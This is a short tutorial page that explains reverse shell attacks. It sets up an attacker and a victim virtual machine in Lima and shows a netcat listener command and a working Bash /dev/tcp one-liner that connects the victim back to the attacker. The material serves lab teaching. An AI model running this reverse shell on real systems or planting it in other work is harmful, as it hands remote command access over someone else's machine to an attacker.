# Reverse Shell

In a reverse shell attack, threat actors identify a target system and
cause them to send a remote connection request. The attacker's system
acts as a listener and accepts the request, creating a remote shell to
the victim's device.

## Reverse Shell Example Using Lima VMs

In Lima the [user-v2] network provides a user-mode networking similar to the [default user-mode network]
and also provides support for VM to VM communication. An instance's IP address is resolvable
from another instance as `lima-<NAME>.internal.` (e.g., `lima-default.internal.`)

[user-v2]: https://lima-vm.io/docs/config/network/user-v2/
[default user-mode network]: https://lima-vm.io/docs/config/network/user/

``` mermaid
flowchart LR
    attacker["LimaVM: reverse-shell-attacker (192.168.104.1:4444)"]
    victim["LimaVM: reverse-shell-victim (192.168.104.3)"]
    attacker <-- commands --> victim
```


=== "Attacker"

    ```
    limactl start --name=reverse-shell-attacker --disk=20 \
      --network=lima:user-v2 template:ubuntu
    ```

=== "Victim"

    ```
    limactl start --name=reverse-shell-victim --disk=20 \
      --network=lima:user-v2 template:ubuntu
    ```

Here is a code example of a Bash reverse shell that can be used to establish a command shell
on a remote machine:

=== "Attacker"

    Start a listener on the attacker's machine.

    ```
    nc -nlvp 4444
    ```

=== "Victim"

    On the target machine, use Bash to establish a connection back to the listener.

    ```
    bash -i >& /dev/tcp/192.168.104.1/4444 <&1
    ```

## Further Reading

* <https://www.aquasec.com/cloud-native-academy/cloud-attacks/reverse-shell-attack/>
